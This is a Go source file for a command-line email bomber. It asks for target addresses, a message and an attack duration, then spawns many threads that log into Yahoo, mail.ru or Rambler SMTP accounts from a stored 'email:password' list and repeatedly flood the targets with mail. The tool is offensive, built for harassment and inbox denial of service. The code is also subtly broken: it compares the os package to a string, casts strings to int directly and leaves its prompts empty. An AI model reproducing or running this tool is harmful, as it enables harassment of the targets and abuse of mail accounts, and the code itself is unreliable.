package core

import (
	"fmt"
	"net/smtp"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	r     = "0"
	r2    = "0"
	todo  = 0
	started = 0
	lock  sync.Mutex
)

var accounts = []string{}

func stat() {
	if os == "windows" {
	}

	if started == todo {
		lock.Lock()
		defer lock.Unlock()
		fmt.Printf("[STATUS] SENT: %s FAILS: %s\n", r, r2)
	}
}

func emailThread(timeA int, targets []string, message, subject string) {
	t := time.Now()
	for time.Since(t).Seconds() < float64(timeA) {
		for _, account := range accounts {
			for _, target := range targets {
				smtpServer := ""
				switch {
				case strings.Contains(account, "@yahoo.com"):
					smtpServer = "smtp.mail.yahoo.com"
				case strings.Contains(account, "@mail.ru") || strings.Contains(account, "@bk.ru") ||
					strings.Contains(account, "@inbox.ru") || strings.Contains(account, "@list.ru") ||
					strings.Contains(account, "@internet.ru") || strings.Contains(account, "@payeerbox.ru"):
					smtpServer = "smtp.mail.ru"
				default:
					smtpServer = "smtp.rambler.ru"
				}

				line := strings.Split(account, ":")
				fromEmail := line[0]
				fromPas := line[1]

				auth := smtp.PlainAuth("", fromEmail, fromPas, smtpServer)
				msg := []byte("To: " + target + "\r\n" +
					"Subject: " + subject + "\r\n" +
					"\r\n" +
					message + "\r\n")
				err := smtp.SendMail(smtpServer+":587", auth, fromEmail, []string{target}, msg)
				if err != nil {
					r2 = fmt.Sprintf("%d", (int(r2) + 1))
					stat()
				} else {
					r = fmt.Sprintf("%d", (int(r) + 1))
					stat()
				}
			}
		}
	}
}

func emailStart() {
	var text, text2, text3, text4 string

	if os == "windows" {
	} else {
	}

	fmt.Println(text2)

	fmt.Print("email(s) for the attack > ")
	var emails string
	fmt.Scan(&emails)
	emails = strings.ReplaceAll(emails, " ", "")
	emailList := strings.Split(emails, ",")
	fmt.Print("message to send > ")
	var mes string
	fmt.Scan(&mes)
	fmt.Print("message subject > ")
	var subject string
	fmt.Scan(&subject)

	fmt.Print(text2) 
	fmt.Print(text3)

	var todo, timeAttack int
	fmt.Print(text)
	fmt.Scan(&todo)
	fmt.Print(text2)
	fmt.Scan(&timeAttack)

	var wg sync.WaitGroup
	for i := 0; i < todo; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			emailThread(timeAttack, emailList, mes, subject)
			started++
			fmt.Printf("[%d] %s\n", started, text3)
		}()
	}
	wg.Wait()
}
